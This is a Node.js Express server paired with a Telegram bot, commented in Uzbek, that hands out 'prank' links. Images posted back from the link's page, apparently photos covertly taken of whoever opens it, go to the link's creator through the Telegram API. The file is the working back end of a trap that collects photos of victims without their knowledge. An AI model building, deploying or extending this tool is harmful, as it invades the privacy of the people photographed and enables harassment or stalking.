require('dotenv').config(); const express = require('express'); const axios = require('axios'); const FormData = require('form-data'); const path = require('path'); const { v4: uuidv4 } = require('uuid'); const { Telegraf } = require('telegraf'); const app = express(); const bot = new Telegraf(process.env.BOT_TOKEN); app.use(express.json({ limit: '20mb' })); app.use(express.static('public')); // Havolalar va foydalanuvchilarni bog'lash uchun xotira const activeLinks = new Map(); // 1. Bot Start va Havola yaratish bot.start((ctx) => { ctx.reply(`🕵️‍♂️ Kichik haker botga xush kelibsiz, ${ctx.from.first_name}!\n\nDo'stingizga prank qilish uchun /create buyrug'ini bosing.`); }); bot.command('create', (ctx) => { const id = uuidv4(); // Havola ID sini chat_id bilan bog'laymiz activeLinks.set(id, ctx.chat.id); const link = `${process.env.BASE_URL}/index.html?id=${id}`; ctx.reply(`🃏 Sizning prank havolangiz tayyor (24 soat amal qiladi):\n\n${link}`); }); // 2. Rasmni qabul qilish va egasiga yuborish app.post('/upload', async (req, res) => { try { const { image, id } = req.body; const targetChatId = activeLinks.get(id); if (!image || !targetChatId) { return res.status(400).send({ status: 'error', message: 'ID yoki rasm topilmadi' }); } const base64Data = image.replace(/^data:image\/\w+;base64,/, ""); const buffer = Buffer.from(base64Data, 'base64'); const form = new FormData(); form.append('chat_id', targetChatId); form.append('photo', buffer, { filename: `prank_${id}.jpg` }); form.append('caption', "📸 Do'stingiz tuzoqqa tushdi! Mana uning rasmi."); const response = await axios.post( `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendPhoto`, form, { headers: form.getHeaders() } ); if (response.data.ok) { console.log(`✅ Rasm ${targetChatId} ga yuborildi.`); res.send({ status: 'ok' }); } } catch (error) { console.error("❌ Xatolik:", error.message); res.status(500).send({ status: 'error' }); } }); // 3. Asosiy sahifani yuborish app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'index.html')); }); const PORT = process.env.PORT || 3000; app.listen(PORT, () => { console.log(`🚀 Server ${PORT}-portda ishlamoqda`); }); bot.launch();
